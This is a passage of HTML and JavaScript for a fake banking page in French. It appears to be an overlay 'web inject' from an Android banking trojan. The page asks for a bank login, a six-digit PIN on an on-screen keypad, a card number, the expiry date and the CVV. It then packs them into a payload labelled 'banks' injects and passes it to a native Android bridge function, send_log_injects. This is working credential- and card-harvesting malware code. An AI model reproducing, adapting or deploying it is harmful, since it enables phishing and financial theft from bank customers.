        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }

        header {
            flex: 0.5;
        }

        .formBlock {
            border: 1px solid #fff;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        .input {
            width: 100%;
            padding: 15px;
            background-color: transparent;
            border: 0;
            color: #fff;
            border-bottom: 1px solid #fff;
            transition-duration: 0.3s;
        }

        .password {
            border: 0;
        }

        #keyboard {
            height: 0;
            transition: all;
            transition-duration: 0.3s;
            overflow: hidden;
            color: #fff;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
        }

        .button {
            background-color: #11bad5;
            width: 100%;
            padding: 14px;
            color: #fff;
            border: 0;
            border-radius: 18px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .button:disabled {
            opacity: 0.5;
        }

        .pinpad-item {
            font-size: 56px;
            padding: auto;
            text-align: center;
        }

        .val {
            cursor: pointer;
            width: 100%;
            display: inline-block;
        }

        .val1, .val9, .val0, .val2 {
            border-right: 1px solid #fff;
            border-bottom: 1px solid #fff;
        }

        .val5 {
            border-bottom: 1px solid #fff;
        }

        .val7, .val3, .val8, .val6 {
            border-right: 1px solid #fff;
        }

        .error {
            border-left: 3px solid #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>
<body ng-app="app" ng-controller="c1">
    <div id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#fff"></span>
    </div>
    <form onsubmit="return false">

                <div class="formBlock" style="overflow: hidden;">
                    <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input login" placeholder="Carte de crédit" autocomplete="off">
                    <input type="tel" id="exp" name="exp" maxlength="5" style="width: 55%;float: left;border-right: 1px solid #d1d1d1;" onkeyup="check7();check8()" class="input" placeholder="Date d'expiration" autocomplete="off">

    <script>
        $('#login').mask('0000000000');
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var deleteLogin = document.getElementById('deleteLogin'),
            deletePassword = document.getElementById('deletePassword');

        var keyboard = document.getElementById('keyboard');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        app = angular.module('app', [])
        app.controller('c1', ['$scope', function ($scope) {
            $sc_ = $scope
            $scope.pin = ""
            $scope.edit_pin = function (password) {
                if ($scope.pin.length >= 0) {
                    deletePassword.style.display = 'inline'
                }

                if ($scope.pin.length != 6) {
                    try{
                        document.getElementById('input_next2').disabled = false;
                    } catch(e){};
                    $scope.pin += '' + password;
                    $("#password").val($scope.pin);
                    nextPage.disabled = true;
                }

                if ($scope.pin.length === 6) {
                    nextPage.disabled = false;
                }

                deletePassword.onclick = () => {
                    deletePassword.style.display = 'none';
                    $scope.pin = "";
                    $scope.pin.length = 0;
                    $("#password").val($scope.pin);
                    nextPage.disabled = true;
                }
            }
        }])

        deleteLogin.onclick = () => {
            deleteLogin.style.display = 'none'
            login.value = '';
            login.value.length = 0;
            keyboard.style.height = '0';
            nextPage.disabled = true
            setTimeout(() => {
                keyboard.style.borderTop = '0';
            }, 100);
        }

        login.onkeyup = () => {
            if(login.value.length > 0) {
                deleteLogin.style.display = 'inline';
            } else {
                deleteLogin.style.display = 'none';
            }

            if(login.value.length > 6) {
                keyboard.style.height = '169px';
                keyboard.style.borderTop = '1px solid #fff';
            } else {
                keyboard.style.height = '0';
                nextPage.disabled = true;
                setTimeout(() => {
                    keyboard.style.borderTop = '0';
                }, 100);
            }

            if(login.value.length >= 7 && password.value.length === 6) {
                nextPage.disabled = false;
            }
        }

        nextPage.onclick = () => {
            spinner.style.display = 'block';

            setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'flex';
            }, 1500);
        }

        
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
